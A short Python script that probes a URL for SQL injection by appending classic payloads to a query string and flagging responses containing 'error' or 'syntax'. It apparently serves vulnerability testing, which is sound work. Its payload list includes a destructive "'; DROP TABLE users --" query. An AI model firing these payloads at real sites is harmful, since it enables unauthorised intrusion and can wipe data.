import requests

def test_sql_injection(url):
    sqli_payloads = [
        "' OR 1=1 --", 
        "' UNION SELECT NULL, NULL, NULL --", 
        "' AND 1=2 --",  
        "'; DROP TABLE users --",  
    ]

    for payload in sqli_payloads:
        response = requests.get(url + payload)
        if "error" in response.text or "syntax" in response.text:
            print(f"Possible SQL Injection vulnerability found with payload: {payload}")

def main(url):
    print(f"Testing for SQL Injection on {url}...")
    test_sql_injection(url)

# Contoh penggunaan
main("http://example.com/search?q=")
